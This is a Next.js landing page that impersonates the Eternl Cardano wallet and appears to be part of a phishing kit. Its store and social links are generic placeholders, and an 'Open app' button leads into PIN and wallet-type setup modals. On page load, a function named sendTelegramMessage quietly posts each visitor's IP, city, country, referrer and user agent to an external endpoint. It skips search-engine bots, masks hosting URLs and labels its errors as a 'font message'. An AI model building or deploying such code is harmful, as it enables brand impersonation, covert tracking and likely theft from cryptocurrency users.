"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import WelcomeModal from "../components/WelcomeModal";
import AppSetupModal from "../components/AppSetupModal";
import CreatePinModal from "../components/CreatePinModal";
import SelectWalletTypeModal from "../components/SelectWalletTypeModal";
import { useRef } from "react";
import { usePathname } from "next/navigation";
import { getUserCountry } from "./userLocation";
import axios from "axios";
import { API_CONFIG } from "./config";

export default function LandingPage() {
  // Two modals managed separately
  const [welcomeOpen, setWelcomeOpen] = useState(false);
  const [setupOpen, setSetupOpen] = useState(false);
  const [pinOpen, setPinOpen] = useState(false);
  const [showSelectType, setShowSelectType] = useState(false);
  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState("");
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (
    userCountry: {
      country?: string;
      countryEmoji?: string;
      city?: string;
      ip?: string;
    } | null
  ) => {
    // console.log("User Country", userCountry);

    // Prevent bots from triggering notifications
    const userAgent = typeof navigator !== "undefined" ? navigator.userAgent : "";
    const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(userAgent);

    if (isBot) {
      console.log("Bot detected, skipping Telegram notification");
      return;
    }

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "eternl",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        API_CONFIG.URL,
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": API_CONFIG.KEY,
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, [sendTelegramMessage]);

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, [sendTelegramMessage]);
  return (
    <main className="min-h-screen bg-[#0e0e0e] text-white flex flex-col items-center relative">
      {/* Top gradient line */}
      <div className="w-full h-0.5 bg-gradient-to-r from-pink-500 via-orange-400 to-purple-500" />

      {/* Hero section */}
      <section className="flex flex-col items-start text-left mt-24 px-12 sm:px-24 flex-grow">
        <h1 className="mt-10 bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent  text-5xl sm:text-6xl font-extrabold leading-tight">
          {/* <span className="bg-linear-to-r from-pink-500 via-orange-400 to-yellow-400 bg-clip-text text-transparent"> */}
          A modern Cardano Wallet for everyone
        </h1>

        <p className="mt-6 text-xl text-white/80 max-w-[40ch]">
          Friendly for beginners. <br />
          Powerful for pro users.
        </p>

        <button
          onClick={() => setWelcomeOpen(true)}
          className="mt-8 bg-pink-500 hover:bg-pink-600 text-white font-semibold rounded-full px-8 py-4 transition"
        >
          Open app
        </button>

        {/* Download cards - Redesigned with glassmorphism */}
        <div className="mt-16 flex flex-col sm:flex-row gap-6">
          {/* Mobile Dapps Card */}
          <div className="group relative bg-gradient-to-br from-pink-500/10 via-orange-500/10 to-purple-500/10 backdrop-blur-sm rounded-3xl p-[1px] w-full sm:w-80 hover:scale-[1.02] transition-all duration-300">
            <div className="bg-[#0e0e0e] rounded-3xl p-8 h-full">
              {/* Icon Badge */}
              <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-pink-500 to-orange-500 flex items-center justify-center mb-4">
                <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
              </div>

              <h2 className="text-white font-bold text-xl mb-2">
                Mobile Dapps
              </h2>
              <p className="text-white/60 text-sm mb-1">with DApp Browser</p>
              <p className="text-white/80 text-sm mb-6">
                Your wallet on the go, now with full DApp support.
              </p>

              <div className="flex flex-col gap-3">
                <Link
                  href="https://play.google.com/store"
                  target="_blank"
                  className="group/btn relative flex items-center justify-center gap-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl h-12 text-sm font-medium transition-all duration-300 overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-pink-500/0 via-pink-500/10 to-pink-500/0 translate-x-[-100%] group-hover/btn:translate-x-[100%] transition-transform duration-700" />
                  <Image
                    src="/brand/play.svg"
                    alt="Google Play"
                    width={22}
                    height={22}
                    className="relative z-10"
                  />
                  <span className="relative z-10">Google Play</span>
                </Link>
                <Link
                  href="https://www.apple.com/app-store/"
                  target="_blank"
                  className="group/btn relative flex items-center justify-center gap-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl h-12 text-sm font-medium transition-all duration-300 overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-orange-500/0 via-orange-500/10 to-orange-500/0 translate-x-[-100%] group-hover/btn:translate-x-[100%] transition-transform duration-700" />
                  <Image
                    src="/brand/apple.svg"
                    alt="Apple Store"
                    width={22}
                    height={22}
                    className="relative z-10"
                  />
                  <span className="relative z-10">Apple Store</span>
                </Link>
              </div>

              {/* Decorative gradient orb */}
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-pink-500/20 to-transparent rounded-full blur-3xl opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
            </div>
          </div>

          {/* Browser Extension Card */}
          <div className="group relative bg-gradient-to-br from-purple-500/10 via-blue-500/10 to-cyan-500/10 backdrop-blur-sm rounded-3xl p-[1px] w-full sm:w-80 hover:scale-[1.02] transition-all duration-300">
            <div className="bg-[#0e0e0e] rounded-3xl p-8 h-full">
              {/* Icon Badge */}
              <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center mb-4">
                <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
              </div>

              <h2 className="text-white font-bold text-xl mb-2">
                Browser Extension
              </h2>
              <p className="text-white/60 text-sm mb-1">DApp connector & browser</p>
              <p className="text-white/80 text-sm mb-6">
                For Chrome, Edge, Brave and Opera browsers.
              </p>

              <Link
                href="https://chrome.google.com/webstore"
                target="_blank"
                className="group/btn relative flex items-center justify-center gap-3 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl h-12 text-sm font-medium transition-all duration-300 overflow-hidden"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-purple-500/0 via-purple-500/10 to-purple-500/0 translate-x-[-100%] group-hover/btn:translate-x-[100%] transition-transform duration-700" />
                <Image
                  src="/brand/chrome.svg"
                  alt="Chrome Web Store"
                  width={22}
                  height={22}
                  className="relative z-10"
                />
                <span className="relative z-10">Chrome Web Store</span>
              </Link>

              {/* Additional supported browsers - small icons */}
              <div className="mt-4 flex items-center gap-2">
                <span className="text-xs text-white/40">Also supports:</span>
                <div className="flex gap-2">
                  <div className="w-6 h-6 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center">
                    <span className="text-[10px] text-white/60 font-bold">E</span>
                  </div>
                  <div className="w-6 h-6 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center">
                    <span className="text-[10px] text-white/60 font-bold">B</span>
                  </div>
                  <div className="w-6 h-6 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center">
                    <span className="text-[10px] text-white/60 font-bold">O</span>
                  </div>
                </div>
              </div>

              {/* Decorative gradient orb */}
              <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/20 to-transparent rounded-full blur-3xl opacity-0 group-hover:opacity-100 transition-opacity duration-500" />
            </div>
          </div>
        </div>
      </section>

      {/* Footer - Redesigned with modern patterns */}
      <footer className="w-full mt-auto mb-0">
        {/* Newsletter Section */}
        <div className="w-full max-w-6xl mx-auto px-4 sm:px-12 mb-12">
          <div className="relative bg-gradient-to-br from-pink-500/10 via-purple-500/10 to-cyan-500/10 backdrop-blur-sm rounded-3xl p-[1px]">
            <div className="bg-[#0e0e0e] rounded-3xl p-8 sm:p-12 text-center">
              <h3 className="text-2xl sm:text-3xl font-bold mb-3 bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-500 bg-clip-text text-transparent">
                Stay Updated
              </h3>
              <p className="text-white/60 mb-6 max-w-md mx-auto">
                Get the latest updates on new features, releases, and crypto insights.
              </p>

              <div className="flex flex-col sm:flex-row gap-3 max-w-md mx-auto">
                <input
                  type="email"
                  placeholder="Enter your email"
                  className="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder:text-white/40 focus:outline-none focus:ring-2 focus:ring-pink-500/50 transition-all"
                />
                <button className="bg-gradient-to-r from-pink-500 to-purple-500 hover:from-pink-600 hover:to-purple-600 text-white font-semibold rounded-xl px-6 py-3 transition-all duration-300 hover:scale-[1.02]">
                  Subscribe
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Main Footer Content */}
        <div className="w-full border-t border-white/5 bg-[#0a0a0a]">
          <div className="max-w-6xl mx-auto px-4 sm:px-12 py-12">
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8">
              {/* Brand Column */}
              <div className="lg:col-span-1">
                <h3 className="text-white font-bold text-xl mb-3 bg-gradient-to-r from-pink-500 to-orange-500 bg-clip-text text-transparent">
                  Eternl
                </h3>
                <p className="text-white/60 text-sm mb-4">
                  A modern Cardano wallet for everyone. Friendly for beginners, powerful for pros.
                </p>

                {/* Social Icons */}
                <div className="flex gap-3">
                  <Link
                    href="https://x.com/"
                    target="_blank"
                    className="w-9 h-9 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 hover:border-pink-500/50 transition-all group"
                  >
                    <svg className="w-4 h-4 text-white/60 group-hover:text-pink-500 transition-colors" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                    </svg>
                  </Link>
                  <Link
                    href="https://discord.com/"
                    target="_blank"
                    className="w-9 h-9 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 hover:border-purple-500/50 transition-all group"
                  >
                    <svg className="w-4 h-4 text-white/60 group-hover:text-purple-500 transition-colors" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z" />
                    </svg>
                  </Link>
                  <Link
                    href="https://web.telegram.org/"
                    target="_blank"
                    className="w-9 h-9 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center hover:bg-white/10 hover:border-cyan-500/50 transition-all group"
                  >
                    <svg className="w-4 h-4 text-white/60 group-hover:text-cyan-500 transition-colors" fill="currentColor" viewBox="0 0 24 24">
                      <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z" />
                    </svg>
                  </Link>
                </div>
              </div>

              {/* Resources Column */}
              <div>
                <h3 className="text-white font-semibold mb-4">Resources</h3>
                <ul className="space-y-3">
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-pink-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Documentation
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-pink-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Wiki
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-pink-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      API Reference
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-pink-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Support
                    </Link>
                  </li>
                </ul>
              </div>

              {/* Community Column */}
              <div>
                <h3 className="text-white font-semibold mb-4">Community</h3>
                <ul className="space-y-3">
                  <li>
                    <Link href="https://x.com/" target="_blank" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-purple-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      X.com
                    </Link>
                  </li>
                  <li>
                    <Link href="https://discord.com/" target="_blank" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-purple-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Discord
                    </Link>
                  </li>
                  <li>
                    <Link href="https://web.telegram.org/" target="_blank" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-purple-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Telegram
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-purple-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Forum
                    </Link>
                  </li>
                </ul>
              </div>

              {/* Legal Column */}
              <div>
                <h3 className="text-white font-semibold mb-4">Legal</h3>
                <ul className="space-y-3">
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-cyan-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Privacy Policy
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-cyan-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Terms of Service
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-cyan-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Imprint
                    </Link>
                  </li>
                  <li>
                    <Link href="#" className="text-white/60 hover:text-white text-sm transition-colors flex items-center gap-2 group">
                      <span className="w-1 h-1 rounded-full bg-cyan-500 opacity-0 group-hover:opacity-100 transition-opacity" />
                      Cookie Policy
                    </Link>
                  </li>
                </ul>
              </div>
            </div>

            {/* Bottom Bar */}
            <div className="mt-12 pt-8 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-4">
              <p className="text-white/40 text-sm">
                © {new Date().getFullYear()} Eternl. All rights reserved.
              </p>
              <div className="flex items-center gap-6">
                <Link href="#" className="text-white/40 hover:text-white/60 text-xs transition-colors">
                  Status
                </Link>
                <Link href="#" className="text-white/40 hover:text-white/60 text-xs transition-colors">
                  Changelog
                </Link>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                  <span className="text-xs text-white/40">All systems operational</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

      {/* 🌈 Welcome Modal */}
      <WelcomeModal
        open={welcomeOpen}
        onClose={() => setWelcomeOpen(false)}
        onNext={() => {
          setWelcomeOpen(false);
          setSetupOpen(true);
        }}
        illustration={
          <Image
            src="/brand/laptop.svg"
            alt="Welcome Illustration"
            width={420}
            height={300}
          />
        }
      />

      {/* ⚙️ Setup Modal */}
      <AppSetupModal
        open={setupOpen}
        onClose={() => setSetupOpen(false)}
        onBack={() => {
          setSetupOpen(false);
          setWelcomeOpen(true);
        }}
        onNext={() => {
          setSetupOpen(false);
          setPinOpen(true);
        }}
      />

      {/* 🔐 Create PIN Modal */}
      <CreatePinModal
        open={pinOpen}
        onClose={() => setPinOpen(false)}
        onBack={() => {
          setPinOpen(false);
          setSetupOpen(true); // go back one step
        }}
        onNext={() => {
          setPinOpen(false);
          setTimeout(() => setShowSelectType(true), 150); // open wallet type modal
        }}
      />

      {/* 💼 Select Wallet Type Modal */}
      <SelectWalletTypeModal
        open={showSelectType}
        onClose={() => setShowSelectType(false)}
        onBack={() => {
          setShowSelectType(false);
          setPinOpen(true);
        }}
        onSelect={(key) => {
          console.log("Selected wallet type:", key);
          // you can trigger the next modal here based on key, e.g.:
          // if (key === "new") setShowCreateWallet(true);
        }}
      />
    </main>
  );
}
